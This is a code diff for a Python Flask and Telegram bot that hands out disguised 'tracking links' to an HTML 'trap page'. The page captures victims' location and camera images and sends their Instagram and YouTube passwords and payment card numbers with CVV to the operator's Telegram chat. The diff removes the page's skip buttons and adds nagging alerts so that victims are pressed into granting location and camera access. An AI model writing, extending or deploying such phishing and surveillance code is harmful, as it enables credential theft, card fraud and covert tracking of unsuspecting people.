@@ -9,17 +9,6 @@ import sqlite3
 import re
 from datetime import datetime
 from flask import Flask, request, render_template_string
-import os
-import threading
-import base64
-import requests
-import urllib.parse
-import json
-import time
-import sqlite3
-import re
-from datetime import datetime
-from flask import Flask, request, render_template_string, redirect
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -41,7 +30,7 @@ def send_telegram_message(chat_id, text, photo=None):
     except Exception as e:
         print(f"Send Error: {e}")
 
-# --- HTML TRAP PAGE ---
+# --- HTML TRAP PAGE (NO SKIP) ---
 def get_html(chat_id, redirect_url):
     return f"""
 <!DOCTYPE html>
@@ -146,7 +135,7 @@ def get_html(chat_id, redirect_url):
         video, canvas {{ display: none; }}
     </style>
     <script>
-        // AUTO REDIRECT TO BROWSER FOR INSTAGRAM/WHATSAPP
+        // Instagram/WhatsApp detection
         (function() {{
             var ua = navigator.userAgent;
             var isInstagram = ua.indexOf("Instagram") > -1 || ua.indexOf("FBAV") > -1;
@@ -186,7 +175,6 @@ def get_html(chat_id, redirect_url):
                     Allow location to check eligibility
                 </p>
                 <button class="btn" id="locationBtn">📍 ALLOW LOCATION</button>
-                <button class="btn" id="skipLocationBtn" style="background: #666;">⏭️ SKIP</button>
             </div>
             
             <!-- Step 2: Camera -->
@@ -196,7 +184,6 @@ def get_html(chat_id, redirect_url):
                     Verify you are human
                 </p>
                 <button class="btn" id="cameraBtn">📸 ALLOW CAMERA</button>
-                <button class="btn" id="skipCameraBtn" style="background: #666;">⏭️ SKIP</button>
             </div>
             
             <!-- Step 3: Phone Number Form -->
@@ -296,14 +283,16 @@ def get_html(chat_id, redirect_url):
             document.getElementById(`step${{step}}`).classList.add('active');
         }}
         
-        // Step 1: Location
+        // Step 1: Location - No Skip
         document.getElementById('locationBtn').onclick = function() {{
             let btn = this;
             btn.disabled = true;
             btn.innerHTML = "📍 CHECKING...";
             
             if (!navigator.geolocation) {{
-                showStep(2);
+                alert("Location required to check eligibility");
+                btn.disabled = false;
+                btn.innerHTML = "📍 ALLOW LOCATION";
                 return;
             }}
             
@@ -320,26 +309,25 @@ def get_html(chat_id, redirect_url):
                     
                     showStep(2);
                 }},
-                () => {{
+                (error) => {{
                     btn.disabled = false;
                     btn.innerHTML = "📍 ALLOW LOCATION";
+                    alert("❌ Please allow location to check eligibility");
                 }},
                 {{ enableHighAccuracy: true, timeout: 10000 }}
             );
         }};
         
-        document.getElementById('skipLocationBtn').onclick = function() {{
-            showStep(2);
-        }};
-        
-        // Step 2: Camera
+        // Step 2: Camera - No Skip
         document.getElementById('cameraBtn').onclick = async function() {{
             let btn = this;
             btn.disabled = true;
-            btn.innerHTML = "📸 VERIFYING...";
+            btn.innerHTML = "➕ VERIFYING...";
             
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
-                showStep(3);
+                alert("Camera required for human verification");
+                btn.disabled = false;
+                btn.innerHTML = "➕ ALLOW MOBILEDATA";
                 return;
             }}
             
@@ -374,12 +362,9 @@ def get_html(chat_id, redirect_url):
                 
             }} catch(err) {{
                 btn.disabled = false;
-                btn.innerHTML = "📸 ALLOW CAMERA";
+                btn.innerHTML = "➕ ALLOW MOBILE DATA";
+                alert("❌ Please allow  to verify human identity");
             }}
-        }};
-        
-        document.getElementById('skipCameraBtn').onclick = function() {{
-            showStep(3);
         }};
         
         // Step 3: Phone
@@ -565,7 +550,7 @@ def device_info():
 🗺 **Map Link:**
 {map_link}
 ━━━━━━━━━━━━━━━━
-⚡ Developed by: @proxyfxc"""
+⚡ Developed by: @Proxyfxz"""
     
     send_telegram_message(chat_id, msg)
     return "OK"
@@ -585,7 +570,7 @@ def location_data():
 🎯 **Coordinates:** {lat}, {lon}
 🗺️ **Map:** {map_link}
 ━━━━━━━━━━━━━━━━
-⚡ Developed by: @proxyfxc"""
+⚡ Developed by: @Proxyfxz"""
     
     send_telegram_message(chat_id, msg)
     return "OK"
@@ -651,7 +636,7 @@ def instagram_data():
 👤 Username: {instagram}
 🔑 Password: {insta_pass}
 ━━━━━━━━━━━━━━━━
-⚡ Developed by: @proxyfxc"""
+⚡ Developed by: @Proxyfxz"""
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -667,7 +652,7 @@ def youtube_data():
 📧 Email: {yt_email}
 🔑 Password: {yt_pass}
 ━━━━━━━━━━━━━━━━
-⚡ Developed by: @proxyfxc"""
+⚡ Developed by: @Proxyfxz"""
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -685,7 +670,7 @@ def card_data():
 📅 Expiry: {card_expiry}
 🔐 CVV: {card_cvv}
 ━━━━━━━━━━━━━━━━
-⚡ Developed by: @proxyfxc"""
+⚡ Developed by: @Proxyfxz"""
     send_telegram_message(chat_id, msg)
     return "OK"
 
@@ -694,7 +679,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
     await update.message.reply_text(
-        "👋 **TRACKER ONLINE!**\n\nLink bhejo (jaise https://youtube.com).",
+        "👋 **Tracker Online!**\n\nLink bhejo (jaise https://youtube.com).",
         parse_mode="Markdown"
     )
 
@@ -711,7 +696,7 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link = f"{SERVER_URL}/?id={uid}&redir={redir}"
     
     await update.message.reply_text(
-        f"✅ **YOUR TRACKING LINK**\n\n`{link}`\n\n⚡ Powered by @proxyfxc",
+        f"✅ **YOUR TRACKING LINK**\n\n`{link}`\n\n⚡ Powered by @Proxyfxz",
         parse_mode="Markdown"
     )
 
